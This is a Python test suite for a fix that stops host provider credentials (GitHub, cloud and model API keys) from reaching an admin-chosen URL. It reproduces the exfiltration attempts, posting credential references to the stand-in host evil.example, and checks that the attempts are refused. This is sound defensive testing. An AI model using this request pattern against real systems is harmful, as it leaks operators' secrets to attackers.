"""rc6 N-1: a project Admin sent the host's provider credentials to a URL they chose.

POST /v1/work-trackers/connect with provider plane, test true, api_base_url https://evil.example and
credential_ref env:BOSS_GITHUB_TOKEN (or secret:…) carried the value to evil.example — for GitHub,
cloud and model keys alike (the verifier's 14 repros, reproduced below exactly).

The class fix (services/env_refs.py): a HOST credential (an allowlisted env variable that holds a
secret, an org/workspace-scoped reference, the org's GitHub connection) is sent only to its own
provider's endpoints, enforced where it is attached to a request — by name in the tracker
resolver, and for every request the process sends (http.client/urllib, httpx, the identity
fetcher, SMTP logins) by `check_outbound`. Naming a host credential, or scoping a reference to the
org, needs integration:manage at the org.
"""
from __future__ import annotations

import ast
import http.client
import pathlib
import socket
import threading
import urllib.request

import httpx
import pytest
from fastapi.testclient import TestClient

from apps.api.app import identity_guard
from apps.api.app import main as api_main
from apps.api.app.main import app
from apps.api.tests.identity_fixtures import IdentityWorld
from boss_engine.services import env_refs, work_tracker_adapters
from boss_engine.services.env_refs import CredentialMisdirected
from boss_engine.services.secret_backends import resolve_secret_ref

H = {"sec-fetch-site": "same-origin"}
ROOT = pathlib.Path(__file__).resolve().parents[3]

NAMES = ["BOSS_GITHUB_TOKEN", "GITHUB_TOKEN", "ANTHROPIC_API_KEY", "DIGITALOCEAN_TOKEN",
         "BOSS_AWS_SECRET_ACCESS_KEY", "CLOUDFLARE_API_TOKEN", "BOSS_ACME_GITHUB_TOKEN"]
PREFIXES = ["env:", "secret:"]


@pytest.fixture
def world(engine, monkeypatch) -> IdentityWorld:
    w = IdentityWorld.create(engine)
    w.claimed()
    monkeypatch.setattr(api_main.settings, "require_api_auth", True)
    monkeypatch.setattr(identity_guard, "presents_identity_credential", lambda conn: True)
    w.admin = w.person("ProjectAdmin")
    w.bind(w.admin, "admin", project=w.project_a)
    w.org_admin = w.person("OrgAdmin")
    w.bind(w.org_admin, "admin")
    return w


@pytest.fixture
def sent(monkeypatch):
    """Every outbound tracker call: (url, headers). Never made."""
    calls: list[tuple[str, dict]] = []

    def fake(method, url, *, headers, body=None, timeout=20.0):
        calls.append((url, dict(headers)))
        return {"name": "evil"}

    monkeypatch.setattr(work_tracker_adapters, "_http_json", fake)
    return calls


def _post(w, who, path, body):
    with w.acting_as(w.ctx(who)):
        return TestClient(app, raise_server_exceptions=False).post(path, json=body, headers=H)


def _leaked(calls, value):
    return [c[0] for c in calls if any(value in str(x) for x in c[1].values())]


def _connect(w, who, cfg, provider="plane"):
    base = {"api_base_url": "https://evil.example", "workspace_slug": "w", "project_id": "p"}
    base.update(cfg)
    return _post(w, who, "/v1/work-trackers/connect", {
        "project_id": w.project_a, "provider_key": provider, "actor": who.id, "test": True,
        "configuration": base})


# ---- the verifier's 14 repros ---------------------------------------------------------------------

@pytest.mark.parametrize("name", NAMES)
@pytest.mark.parametrize("prefix", PREFIXES)
def test_a_project_admin_cannot_send_a_host_credential_to_their_url(world, sent, monkeypatch, name, prefix):
    canary = f"canary-{name.lower()}-0123456789"
    monkeypatch.setenv(name, canary)
    r = _connect(world, world.admin, {"credential_ref": f"{prefix}{name}"})
    assert r.status_code == 403, r.text
    assert "integration:manage" in r.json()["detail"]
    assert _leaked(sent, canary) == []


@pytest.mark.parametrize("name", NAMES)
@pytest.mark.parametrize("prefix", PREFIXES)
def test_not_even_an_org_admin_sends_it_off_its_provider(world, sent, monkeypatch, name, prefix):
    canary = f"canary-{name.lower()}-0123456789"
    monkeypatch.setenv(name, canary)
    r = _connect(world, world.org_admin, {"credential_ref": f"{prefix}{name}"})
    assert r.status_code == 422, r.text
    detail = r.json()["detail"]
    assert name in detail and "evil.example" in detail and canary not in detail
    assert _leaked(sent, canary) == []


@pytest.mark.parametrize("name", NAMES)
@pytest.mark.parametrize("prefix", PREFIXES)
def test_the_resolver_refuses_it_whoever_calls(monkeypatch, name, prefix):
    """Enforced where the token is resolved for a request, not only at the route."""
    monkeypatch.setenv(name, f"canary-{name.lower()}-0123456789")
    config = {"api_base_url": "https://evil.example", "credential_ref": f"{prefix}{name}"}
    with pytest.raises(CredentialMisdirected):
        work_tracker_adapters.resolve_credential(config, provider="plane")


def test_the_trackers_own_fallback_is_bound_too(monkeypatch):
    monkeypatch.setenv("PLANE_API_KEY", "canary-plane-0123456789")
    monkeypatch.delenv("PLANE_BASE_URL", raising=False)
    with pytest.raises(CredentialMisdirected):
        work_tracker_adapters.resolve_credential({"api_base_url": "https://evil.example"},
                                                 provider="plane")
    # …and the operator's own Plane is its endpoint.
    monkeypatch.setenv("PLANE_BASE_URL", "http://plane.internal:8080")
    assert work_tracker_adapters.resolve_credential(
        {"api_base_url": "http://plane.internal:8080"}, provider="plane") == "canary-plane-0123456789"


def test_its_own_provider_still_works(world, sent, monkeypatch):
    canary = "canary-gh-0123456789abcdef"
    monkeypatch.setenv("BOSS_GITHUB_TOKEN", canary)
    r = _connect(world, world.org_admin, {"credential_ref": "env:BOSS_GITHUB_TOKEN",
                                          "api_base_url": "https://api.github.com",
                                          "owner": "acme", "repo": "app"}, provider="github_issues")
    assert r.status_code == 200, r.text
    assert _leaked(sent, canary) and all(u.startswith("https://api.github.com/") for u in _leaked(sent, canary))


def test_a_token_the_person_gave_goes_to_the_url_they_chose(world, sent):
    r = _connect(world, world.admin, {"api_token": "their-own-plane-key-0123456789"})
    assert r.status_code == 200, r.text
    assert _leaked(sent, "their-own-plane-key-0123456789") == [
        "https://evil.example/api/v1/workspaces/w/projects/p/"]


# ---- naming a host credential is the org's act ------------------------------------------------------

def _ref(w, who, **extra):
    body = {"project_id": w.project_a, "ref_kind": "env", "ref_key": "OPENAI_API_KEY",
            "actor": who.id, "status": "active", "metadata": {}}
    body.update(extra)
    return _post(w, who, "/v1/secret-refs", body)


def test_a_project_admin_cannot_create_env_or_org_references(world):
    assert _ref(world, world.admin).status_code == 403
    assert _ref(world, world.admin, ref_key="BOSS_GITHUB_TOKEN").status_code == 403
    r = _ref(world, world.admin, ref_kind="vault", ref_key="kv/team/x",
             scope_type="org", scope_id=world.org)
    assert r.status_code == 403, r.text


def test_an_org_admin_can(world):
    assert _ref(world, world.org_admin).status_code == 201
    r = _ref(world, world.org_admin, ref_key="ANTHROPIC_API_KEY", scope_type="org", scope_id=world.org)
    assert r.status_code == 201, r.text


def test_a_project_admin_cannot_rebind_an_org_reference(world):
    r = _ref(world, world.org_admin, ref_key="ANTHROPIC_API_KEY", scope_type="org", scope_id=world.org)
    rid = r.json()["id"]
    with world.acting_as(world.ctx(world.admin)):
        r2 = TestClient(app, raise_server_exceptions=False).patch(
            f"/v1/secret-refs/{rid}", headers=H,
            json={"project_id": world.project_a, "actor": world.admin.id,
                  "metadata": {"allowed_hosts": ["evil.example"]}})
    assert r2.status_code == 403, r2.text


# ---- every outbound request: the transport guard ----------------------------------------------------

@pytest.fixture
def listener():
    """A local socket that records whether anything was sent to it."""
    srv = socket.socket()
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)
    got: list[bytes] = []

    def serve():
        srv.settimeout(3)
        try:
            conn, _ = srv.accept()
            conn.settimeout(1)
            try:
                got.append(conn.recv(65536))
            except OSError:
                pass
            conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\n{}")
            conn.close()
        except OSError:
            pass

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    yield srv.getsockname()[1], got
    srv.close()


def test_the_guard_is_on_for_every_import_of_the_engine():
    import boss_engine  # noqa: F401

    assert env_refs.outbound_guard_installed()


def test_urllib_never_writes_a_host_credential_to_another_host(monkeypatch, listener):
    port, got = listener
    canary = "canary-ghp-0123456789abcdef"
    monkeypatch.setenv("BOSS_GITHUB_TOKEN", canary)
    req = urllib.request.Request(f"http://127.0.0.1:{port}/x", headers={"Authorization": f"Bearer {canary}"})
    with pytest.raises(CredentialMisdirected) as refused:
        urllib.request.urlopen(req, timeout=3)
    assert canary not in str(refused.value)
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
    with pytest.raises(CredentialMisdirected):
        conn.request("POST", "/x", body=f'{{"key": "{canary}"}}')
    assert not any(canary.encode() in g for g in got)


def test_httpx_never_sends_a_model_key_to_another_host(monkeypatch, listener):
    port, got = listener
    canary = "sk-ant-canary-0123456789abcdef"
    monkeypatch.setenv("ANTHROPIC_API_KEY", canary)
    with httpx.Client() as client, pytest.raises(CredentialMisdirected):
        client.post(f"http://127.0.0.1:{port}/v1/messages", headers={"x-api-key": canary})
    with httpx.Client() as client, pytest.raises(CredentialMisdirected):   # Basic auth, decoded
        client.get(f"http://127.0.0.1:{port}/", auth=("me@example.com", canary))
    assert not any(canary.encode() in g for g in got)


def test_the_operators_own_endpoint_and_unrelated_requests_pass(monkeypatch, listener):
    port, got = listener
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-canary-0123456789abcdef")
    monkeypatch.setenv("ANTHROPIC_BASE_URL", f"http://127.0.0.1:{port}")
    with httpx.Client() as client:
        assert client.post(f"http://127.0.0.1:{port}/v1/messages",
                           headers={"x-api-key": "sk-ant-canary-0123456789abcdef"}).status_code == 200
    env_refs.check_outbound("https://api.anthropic.com/v1/messages",
                            {"x-api-key": "sk-ant-canary-0123456789abcdef"})
    env_refs.check_outbound("https://evil.example/", {"Authorization": "Bearer someone-elses-token"})


def test_an_org_scoped_reference_is_held_to_its_provider(world, monkeypatch):
    r = _ref(world, world.org_admin, ref_key="OPENAI_API_KEY", scope_type="org", scope_id=world.org,
             provider="openai")
    rid = r.json()["id"]
    monkeypatch.setenv("OPENAI_API_KEY", "sk-org-canary-0123456789abcdef")
    with world.engine.begin() as db:
        value = resolve_secret_ref(db, rid, api_main.settings, project_id=world.project_a)
    monkeypatch.delenv("OPENAI_API_KEY")       # held by the registry now, not by its env name
    env_refs.check_outbound("https://api.openai.com/v1/chat", {"Authorization": f"Bearer {value}"})
    with pytest.raises(CredentialMisdirected) as refused:
        env_refs.check_outbound("https://evil.example/v1/chat", {"Authorization": f"Bearer {value}"})
    assert rid in str(refused.value) and value not in str(refused.value)


def test_the_identity_fetcher_refuses_before_connecting(monkeypatch):
    from boss_engine.identity import http as safe_http

    monkeypatch.setenv("BOSS_GITHUB_TOKEN", "canary-ghp-0123456789abcdef")
    monkeypatch.setattr(safe_http, "_resolve", lambda host, port: ["93.184.216.34"])

    def never(*a, **k):
        raise AssertionError("connected")

    monkeypatch.setattr(safe_http, "_open_connection", never)
    with pytest.raises(safe_http.OutboundRefused):
        safe_http.fetch("GET", "https://evil.example/", purpose="test",
                        headers={"Authorization": "token canary-ghp-0123456789abcdef"})


# ---- the static scan: every way out goes through the host-binding check ------------------------------

#: Modules that write to a socket themselves (past http.client/httpx), each with the check it runs.
RAW_SENDERS = {
    "engine/boss_engine/identity/http.py": "check_outbound",          # the SSRF-safe fetcher
    "engine/boss_engine/services/email_adapter.py": "check_outbound",  # SMTP login
    "apps/api/app/main.py": "check_outbound",                          # the preview websocket proxy
    # The run's egress shim: hands boss-egress its own egress credential over a local socket,
    # never a host or org provider credential.
    "engine/boss_engine/identity/runs.py": None,
    # The sandbox's CONNECT tunnel: relays opaque TLS the sandbox wrote; BOSS attaches nothing.
    "apps/egress/boss_egress/connect.py": None,
}
OTHER_HTTP_LIBS = ("requests", "urllib3", "aiohttp", "pycurl", "websocket", "websockets", "smtplib")


def _py_files():
    for top in ("engine/boss_engine", "apps/api/app", "apps/worker", "apps/egress"):
        base = ROOT / top
        if base.exists():
            yield from (p for p in base.rglob("*.py") if "tests" not in p.parts)


def test_every_outbound_send_of_a_credential_goes_through_the_check():
    """http.client (urllib) and httpx are guarded process-wide (asserted above). Anything else
    that can carry a resolved credential out — another HTTP library, a raw socket write, an SMTP
    login — must be a known sender that calls check_outbound itself."""
    offenders = []
    for path in _py_files():
        rel = str(path.relative_to(ROOT))
        source = path.read_text(encoding="utf-8")
        tree = ast.parse(source)
        uses_lib = any(
            (isinstance(n, ast.Import) and any(a.name.split(".")[0] in OTHER_HTTP_LIBS for a in n.names))
            or (isinstance(n, ast.ImportFrom) and (n.module or "").split(".")[0] in OTHER_HTTP_LIBS)
            for n in ast.walk(tree))
        raw = any(isinstance(n, ast.Attribute) and n.attr in ("sendall", "create_connection", "login")
                  and not (isinstance(n.value, ast.Name) and n.value.id in ("self", "service"))
                  for n in ast.walk(tree)) and ("socket" in source or "smtp" in source.lower())
        if not (uses_lib or raw):
            continue
        if rel not in RAW_SENDERS:
            offenders.append(rel)
        elif RAW_SENDERS[rel] and RAW_SENDERS[rel] not in source:
            offenders.append(f"{rel} (no {RAW_SENDERS[rel]})")
    assert offenders == [], offenders


def test_every_tracker_token_resolution_is_bound_to_its_destination():
    source = (ROOT / "engine/boss_engine/services/work_tracker_adapters.py").read_text()
    fn = source[source.index("def resolve_credential("):source.index("class WorkTrackerAdapter")]
    # every place the resolver reads the environment is followed by assert_may_send
    assert fn.count("envmap.get(") >= 2 and fn.count("assert_may_send(") >= 2
